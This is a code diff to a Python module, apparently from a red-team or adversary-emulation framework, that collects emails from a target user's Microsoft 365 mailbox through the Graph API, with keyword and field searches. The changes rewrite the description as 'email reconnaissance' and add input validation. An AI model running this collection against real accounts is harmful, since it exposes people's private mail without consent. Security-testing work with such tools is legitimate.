@@ -14,7 +14,7 @@ class M365ExfilUserMailbox(BaseTechnique):
                 sub_technique_name="Remote Email Collection"
             )
         ]
-        super().__init__("Exfil Users Mailbox", "Exfiltrate emails locally from users mailbox. Optionally, provide search keyword and search field to narrow search.", mitre_techniques)
+        super().__init__("Exfil Users Mailbox", "Perform email reconnaissance leveraging Microsoft Graph API to exfiltrate emails from a target user's mailbox. Technique can perform targeted searches across email fields (body, subject, attachments, sender) and extract sensitive information including sender details, recipients, subjects, and message previews - making it useful for both broad mailbox enumeration and focused data collection. Warning: Attempting to exfiltrate entire mailbox can take really long time.", mitre_techniques)
 
     def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
         self.validate_parameters(kwargs)
@@ -24,11 +24,19 @@ class M365ExfilUserMailbox(BaseTechnique):
             search_field: str = kwargs.get('search_field', None)
             
             search_field_options = ['body','subject','attachment','from']
-            endpoint_url = 'https://graph.microsoft.com/v1.0/me/messages?$select=id,from,toRecipients,subject,bodyPreview'
-            if search_term != None:
+            
+            if search_term in ["", None]:
+                endpoint_url = 'https://graph.microsoft.com/v1.0/me/messages?$select=id,from,toRecipients,subject,bodyPreview'
+            
+            else:
                 endpoint_url = f'https://graph.microsoft.com/v1.0/me/messages?$search="{search_term}"&$select=id,from,toRecipients,subject,bodyPreview'
 
-                if search_field != None:
+                if search_field:
+                    if search_field not in search_field_options:
+                        return ExecutionStatus.FAILURE, {
+                            "error": {"Error" : "Invalid Technique Input"},
+                            "message": {"Error" : f"Invalid Technique Input - Search Field must be in {search_field_options}"}
+                        }
                     endpoint_url = f'https://graph.microsoft.com/v1.0/me/messages?$search="{search_field}:{search_term}"&$select=id,from,toRecipients,subject,bodyPreview'
             
             # Get emails from users mailbox
